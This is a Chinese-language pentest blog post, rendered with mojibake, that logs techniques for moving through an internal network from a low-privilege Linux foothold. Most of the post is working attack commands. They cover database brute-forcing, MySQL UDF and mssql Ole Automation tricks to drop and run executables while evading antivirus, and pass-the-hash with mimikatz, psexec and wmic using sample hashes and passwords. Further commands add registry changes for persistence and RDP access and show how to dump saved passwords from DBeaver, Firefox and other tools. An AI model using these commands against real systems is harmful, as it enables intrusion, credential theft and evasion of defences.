<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>å†…ç½‘æ¸—é€æµæ°´è´¦ | ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  <meta name="description" content="0x01 ç¯å¢ƒ
Linuxä¸»æœºwwwæƒé™
ä¸»æœºæ— æ³•å‡ºå¤–ç½‘
æ­£å‘ä»£ç†æ— æ³•ä½¿ç”¨
Bæ®µå†…ç½‘

æ”¶é›†ä¿¡æ¯#####F-Scrack.py
è·å–Redis, ESç­‰
PS: Scrack.pyçš„mssqlæ¨¡å—çˆ†ç ´ä¸å‡†ç¡®ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6



Rediskeyè¾ƒå¤šçš„æ—¶å€™ä¸è¦ä½¿ç”¨keys *
æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯: masterï¼Œæ•°é‡ï¼Œç‰ˆæœ¬å·
ä½¿ç”¨scanæŸ¥çœ‹keys: scan 0 match * count 100 
æŸ¥çœ‹ç±»å‹: type &amp;lt;key&amp;gt;
hashç±»å‹: hgetall &amp;lt;key&amp;gt;

MySQLwindowsä¸‹å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å¯å†™å…¥æ’ä»¶ç›®å½•:"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="å†…ç½‘æ¸—é€æµæ°´è´¦"/>
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> å†…ç½‘æ¸—é€æµæ°´è´¦</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01 ç¯å¢ƒ"></a>0x01 ç¯å¢ƒ</h2><ol>
<li>Linuxä¸»æœºwwwæƒé™</li>
<li>ä¸»æœºæ— æ³•å‡ºå¤–ç½‘</li>
<li>æ­£å‘ä»£ç†æ— æ³•ä½¿ç”¨</li>
<li>Bæ®µå†…ç½‘</li>
</ol>
<h2 id="æ”¶é›†ä¿¡æ¯"><a href="#æ”¶é›†ä¿¡æ¯" class="headerlink" title="æ”¶é›†ä¿¡æ¯"></a>æ”¶é›†ä¿¡æ¯</h2><p>#####F-Scrack.py</p>
<pre class="line-numbers language-none"><code class="language-none">è·å–Redis, ESç­‰
PS: Scrack.pyçš„mssqlæ¨¡å—çˆ†ç ´ä¸å‡†ç¡®ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªç®€å•çš„

python Scrack.py -h 10.111.1.1-10.111.2.254 -p 3306,5432 -m 200 -t 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>keyè¾ƒå¤šçš„æ—¶å€™ä¸è¦ä½¿ç”¨<code>keys *</code></p>
<pre class="line-numbers language-none"><code class="language-none">æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯: masterï¼Œæ•°é‡ï¼Œç‰ˆæœ¬å·
ä½¿ç”¨scanæŸ¥çœ‹keys: scan 0 match * count 100 
æŸ¥çœ‹ç±»å‹: type &lt;key&gt;
hashç±»å‹: hgetall &lt;key&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>windowsä¸‹å¯ä»¥å…ˆæµ‹è¯•æ˜¯å¦å¯å†™å…¥æ’ä»¶ç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">select @@plugin_dir;

select hello into outfile &lt;plugin_dir&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åä½¿ç”¨msfçš„è‡ªå¸¦çš„udfï¼Œå…ˆè½¬æ¢ä¸º16è¿›åˆ¶ï¼Œç„¶åå¯¼å‡ºåˆ°æ’ä»¶ç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">use test;
set @a&#x3D;concat(&#39;&#39;, 0x&lt;hex_of_exe&gt;);
create table Ghost(data LONGBLOB);
insert into Ghost values(&quot;&quot;);
update Ghost set data &#x3D; @a;
select data from Ghost into DUMPFILE &lt;dir&gt;;
create function sys_eval returns string soname &#39;sys_eval.dll&#39;;

drop function sys_eval; &#x2F;&#x2F;ç”¨å®Œåˆ é™¤ï¼Œå…»æˆå¥½ä¹ æƒ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong><code>é¦–é€‰sys_eval, å°½é‡ä¸è¦ä½¿ç”¨sys_exec(ä¼šå´©æºƒ)</code></strong></p>
<h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><p>mssqlçˆ†ç ´å°½é‡æ”¾åœ¨åé¢æ‰§è¡Œï¼ŒåŠ¨é™ä¼šæ¯”è¾ƒå¤§ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">mssqlçˆ†ç ´æˆåŠŸä¹‹åï¼Œæœ€å¥½ä½¿ç”¨CLRæ¥è·å–æƒé™ï¼Œç›´æ¥ä½¿ç”¨&#96;xp_cmdshell&#96;ä¼šæ­»ç¿˜ç¿˜,360ä¼šæ‹¦æˆª
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å·²çŸ¥mssqlçš„ç”¨æˆ·å¯†ç ï¼Œcertutilç­‰å·¥å…·ä¼šè¢«æ‹¦æˆªæˆ–è€…æŠ¥è­¦ï¼Œå¯ä»¥ä½¿ç”¨mssqlè‡ªå¸¦çš„å·¥å…·å†™å…¥åˆ°ç¡¬ç›˜ï¼š</p>
<p>ç°å¼€å¯å­˜å‚¨è¿‡ç¨‹:</p>
<pre class="line-numbers language-none"><code class="language-none">sp_configure &#39;show advanced options&#39;, 1;  
GO  
RECONFIGURE;  
GO  
sp_configure &#39;Ole Automation Procedures&#39;, 1;  
GO  
RECONFIGURE;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="mssqlå†™å¤§æ–‡ä»¶"><a href="#mssqlå†™å¤§æ–‡ä»¶" class="headerlink" title="mssqlå†™å¤§æ–‡ä»¶"></a>mssqlå†™å¤§æ–‡ä»¶</h5><p>æ¯”å¦‚exeä¹‹ç±»çš„å…ˆè½¬æ¢ä¸ºhex,ç„¶åå†å†™å…¥åˆ°æ–‡ä»¶:</p>
<p><code>xxd -plain /tmp/test.exe | tr -d &#39;\n&#39; &gt; /tmp/dll.hex</code></p>
<pre class="line-numbers language-none"><code class="language-none">declare @hexstring varchar(max);
set @hexstring &#x3D; &#39;è½¬æ¢ä¹‹åçš„hex&#39;;
declare @file varbinary(max);
set @file &#x3D; (select cast(&#39;&#39; as xml).value(&#39;xs:hexBinary( substring(sql:variable(&quot;@hexstring&quot;), sql:column(&quot;t.pos&quot;)) )&#39;, &#39;varbinary(max)&#39;)
from (select case substring(@hexstring, 1, 2) when &#39;0x&#39; then 3 else 0 end) as t(pos));

select @file;
declare @init int;
declare @filepath nvarchar(4000) &#x3D; N&#39;c:\22.exe&#39;;

EXEC sp_OACreate &#39;ADODB.Stream&#39;, @init OUTPUT; -- An instace created
EXEC sp_OASetProperty @init, &#39;Type&#39;, 1;
EXEC sp_OAMethod @init, &#39;Open&#39;; -- Calling a method
EXEC sp_OAMethod @init, &#39;Write&#39;, NULL, @file; -- Calling a method
EXEC sp_OAMethod @init, &#39;SaveToFile&#39;, NULL, @filepath, 2; -- Calling a method
EXEC sp_OAMethod @init, &#39;Close&#39;; -- Calling a method
EXEC sp_OADestroy @init; -- Closed the resources<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="mssqlå¤‡ä»½"><a href="#mssqlå¤‡ä»½" class="headerlink" title="mssqlå¤‡ä»½"></a>mssqlå¤‡ä»½</h4><pre class="line-numbers language-none"><code class="language-none">BACKUP DATABASE &lt;db&gt;
TO DISK &#x3D; &#39;C:\Windows\temp\db.bak&#39; WITH COMPRESSION, INIT, STATS &#x3D; 5;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>åˆ†å·å‹ç¼©</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">rar.exe a -m0 -v100m C:\windows\temp\db.split C:\windows\tasks\db.bak

download C:\\windows\\temp\\db.split.rar &#x2F;var&#x2F;tmp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h4><ul>
<li>wmi</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.1.158 &#x2F;user:pt007 &#x2F;password:admin123  process call create &quot;cmd.exe &#x2F;c ipconfig&gt;d:\result.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æ¨èä½¿ç”¨wmiexec.vbs:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs">https://github.com/l3m0n/pentest_study/blob/master/tools/wmiexec.vbs</a></p>
<pre class="line-numbers language-none"><code class="language-none">cscript C:\Windows\Tasks\aliwmi.vbs &#x2F;cmd &lt;ip&gt;  &quot;C:\Windows\system32\calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>msf</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec 
show options
set RHOST 192.168.81.129
set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
set SMBUser Administrator
show options
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>mimikatz || Cobalt Strike</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;sekurlsa::pth &#x2F;domain:. &#x2F;user:administrator &#x2F;ntlm:2D20D252A479F485CDF5E171D93985BF &#x2F;run:cmd.exe&quot; &#x2F;&#x2F;ä¼ é€’hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>psexec</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">psexec &#x2F;accepteula &#x2F;&#x2F;æ¥å—è®¸å¯åè®®
sc delete psexesvc
psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>psexec.vbs</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">cscript psexec.vbs 192.168.1.158 pt007 admin123 &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>è¿œç¨‹å‘½ä»¤æ‰§è¡Œsc</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.17.138\c$ &quot;admin123&quot; &#x2F;user:pt007
net use
dir \\192.168.17.138\c$
copy test.exe \\192.168.17.138\c$
sc \\192.168.17.138 create test binpath&#x3D; &quot;c:\test.exe&quot;
sc \\192.168.17.138 start test
sc \\192.168.17.138 del test
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>windowsè¿œç¨‹æ‰§è¡Œcmdçš„9ç§æ–¹æ³•: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5957">https://xz.aliyun.com/t/5957</a></p>
<h3 id="access-is-denied"><a href="#access-is-denied" class="headerlink" title="access is denied"></a>access is denied</h3><p>å¯¹äºä»»ä½•éRID 500çš„æœ¬åœ°ç®¡ç†å‘˜(Administrator)è¿æ¥åˆ°Windows Vista+çš„è®¡ç®—æœºï¼Œæ— è®ºé‡‡ç”¨wmiã€psexecè¿˜æ˜¯å…¶å®ƒæ–¹æ³•ï¼Œä½¿ç”¨çš„ä»¤ç‰Œéƒ½æ˜¯ä¸­ç­‰ä»¤ç‰Œ, ä½¿ç”¨wmiexecçš„æ—¶å€™ä¼šä¿®æš—ç¤ºAccess is Denied</p>
<p>åœ¨æŠ“å–hashçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œä½¿å¾—æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜éƒ½å¯ä»¥è¿œç¨‹è¿æ¥,ä½œä¸ºä¸€ç§æŒä¹…åŒ–çš„æ‰‹æ®µã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>###RDPçš„PTH<br>æŠ“å–hashæ— æ³•ç ´è§£çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä½¿ç”¨hashè¿œç¨‹ç™»å½•RDPï¼Œéœ€è¦è¢«ç™»å½•çš„ç³»ç»Ÿå¼€å¯â€Restricted Admin Modeâ€, åœ¨Windows8.1å’ŒWindows Server 2012R2ä¸Šé»˜è®¤å¼€å¯ã€‚Windows7å’ŒWinServer 2008éœ€è¦å®‰è£…2871997ã€2973351å¸ƒä¸ã€‚</p>
<h4 id="å¯åŠ¨RDP"><a href="#å¯åŠ¨RDP" class="headerlink" title="å¯åŠ¨RDP"></a>å¯åŠ¨RDP</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f
REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f  # ç›‘å¬ 3389 ç«¯å£ 

å¼€å¯3389
wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="å¼€å¯Restricted-Admin-mode"><a href="#å¼€å¯Restricted-Admin-mode" class="headerlink" title="å¼€å¯Restricted Admin mode"></a>å¼€å¯Restricted Admin mode</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="å¢åŠ é˜²ç«å¢™è§„åˆ™"><a href="#å¢åŠ é˜²ç«å¢™è§„åˆ™" class="headerlink" title="å¢åŠ é˜²ç«å¢™è§„åˆ™"></a>å¢åŠ é˜²ç«å¢™è§„åˆ™</h4><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; dir&#x3D;in protocol&#x3D;TCP localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="dump-passwod"><a href="#dump-passwod" class="headerlink" title="dump passwod"></a>dump passwod</h3><p>####dbeaver</p>
<p>dbeaver6çš„é…ç½®æ–‡ä»¶(ä¸åŒç‰ˆæœ¬å­˜å‚¨çš„ä½ç½®å’Œè§£å¯†æ–¹å¼ä¸ä¸€æ ·):</p>
<pre class="line-numbers language-none"><code class="language-none">#å¯†ç åŠ å¯†å­˜å‚¨ä½ç½®:
C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\credentials-config.json

#urlå’Œç”¨æˆ·å:
C:\Users\&lt;user&gt;\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver\data-sources.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è§£å¯†è„šæœ¬: <a target="_blank" rel="noopener" href="https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61">https://gist.github.com/felipou/50b60309f99b70b1e28f6d22da5d8e61</a></p>
<p>ä¸‹è½½<code>credentials-config.json</code>è„šæœ¬ä¹‹åï¼Œä½¿ç”¨pythonè§£å¯†:<code>python decrypt.py credentials-config.json</code>ï¼Œç„¶åæ ¹æ®è§£å¯†å‡ºæ¥çš„idå»<code>data-sources.json</code>é‡Œé¢æ‰¾å¯¹åº”çš„IPå’Œç”¨æˆ·åã€‚</p>
<p>è€ç‰ˆæœ¬çš„å¯†ç æ˜¯å­˜å‚¨åœ¨:<code>C:\Users\&lt;users&gt;\.dbeaver4\General\.dbeaver-data-source.xml</code>ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨åœ¨çº¿è§£å¯†:<a target="_blank" rel="noopener" href="http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/">http://dbeaver-password-decrypter.s3-website-us-west-2.amazonaws.com/</a></p>
<h3 id="MobaXterm"><a href="#MobaXterm" class="headerlink" title="MobaXterm"></a>MobaXterm</h3><p>æœ‰ä¸€ä¸ª<code>.ini</code>çš„æ–‡ä»¶ï¼Œæœ‰å¯¹åº”çš„IPä¿¡æ¯å’Œç§é’¥åœ°å€<br>è€ç‰ˆæœ¬çš„å­˜å‚¨: C:\Users%USERNAME%\AppData\Roaming\MobaXterm<br>2020å¹´çš„ç‰ˆæœ¬: C:\Users%USERNAME%\Documents\MobaXterm</p>
<h3 id="VSCODE"><a href="#VSCODE" class="headerlink" title="VSCODE"></a>VSCODE</h3><p>Windowsä¸‹çš„é…ç½®æ–‡ä»¶åœ¨è¿™ä¸ªåœ°æ–¹:</p>
<pre class="line-numbers language-none"><code class="language-none">%APPDATA%\Code\User\settings.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>å¯ä»¥æ ¹æ®é…ç½®æ–‡ä»¶æ‰¾åˆ°ç¬”è®°å’Œsshç­‰å­˜å‚¨ä½ç½®</p>
<h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><p>ä¸‰å¥½å¸ˆå‚…è®²çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨firepwd.py:</p>
<pre class="line-numbers language-none"><code class="language-none">firefoxçš„é…ç½®æ–‡ä»¶ç›®å½•:
%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\

ä¸‹è½½è§£å¯†éœ€è¦çš„æ–‡ä»¶:
key4.dbå’Œlogins.json

ä¸‹è½½è§£å¯†è„šæœ¬:
https:&#x2F;&#x2F;github.com&#x2F;lclevy&#x2F;firepwd

ä¸Šé¢ä¸‰ä¸ªä¸œè¥¿æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹:
python3 firepwd.py <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p>
<h3 id="æˆªå±"><a href="#æˆªå±" class="headerlink" title="æˆªå±"></a>æˆªå±</h3><ol>
<li>CSé‡Œé¢çš„<code>screenshot</code></li>
<li>msfé‡Œé¢: <code>use espia</code> <code>screengrab</code></li>
<li>msfçš„æŒç»­æˆªå±: <code>post/windows/gather/screen_spy</code></li>
<li>Win10è‡ªå¸¦: <code>psr.exe /start /gui 0 /output C:\cool.zip /maxlogsize 1</code></li>
</ol>
<h3 id="æœç´¢æ–‡ä»¶"><a href="#æœç´¢æ–‡ä»¶" class="headerlink" title="æœç´¢æ–‡ä»¶"></a>æœç´¢æ–‡ä»¶</h3><pre class="line-numbers language-none"><code class="language-none">åœ¨Cç›˜æœç´¢script.jsè¿™ä¸ªæ–‡ä»¶:
dir &#x2F;s &#x2F;b C:\script.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

	</div>

	
	<span id="/2020/05/14/workgroup-pentest2.html" class="leancloud-visitors view" data-flag-title="å†…ç½‘æ¸—é€æµæ°´è´¦">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2020/07/16/Com-Object-Pentest-Note2.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2020/05/06/python-elk.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2020-05-14 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>45</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E7%8E%AF%E5%A2%83"><span class="toc-article-text">0x01 ç¯å¢ƒ</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="toc-article-text">æ”¶é›†ä¿¡æ¯</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Redis"><span class="toc-article-text">Redis</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MySQL"><span class="toc-article-text">MySQL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#mssql"><span class="toc-article-text">mssql</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#mssql%E5%86%99%E5%A4%A7%E6%96%87%E4%BB%B6"><span class="toc-article-text">mssqlå†™å¤§æ–‡ä»¶</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mssql%E5%A4%87%E4%BB%BD"><span class="toc-article-text">mssqlå¤‡ä»½</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#pth"><span class="toc-article-text">pth</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#access-is-denied"><span class="toc-article-text">access is denied</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%90%AF%E5%8A%A8RDP"><span class="toc-article-text">å¯åŠ¨RDP</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%BC%80%E5%90%AFRestricted-Admin-mode"><span class="toc-article-text">å¼€å¯Restricted Admin mode</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A2%9E%E5%8A%A0%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99"><span class="toc-article-text">å¢åŠ é˜²ç«å¢™è§„åˆ™</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#dump-passwod"><span class="toc-article-text">dump passwod</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MobaXterm"><span class="toc-article-text">MobaXterm</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#VSCODE"><span class="toc-article-text">VSCODE</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Firefox"><span class="toc-article-text">Firefox</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%88%AA%E5%B1%8F"><span class="toc-article-text">æˆªå±</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-article-text">æœç´¢æ–‡ä»¶</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
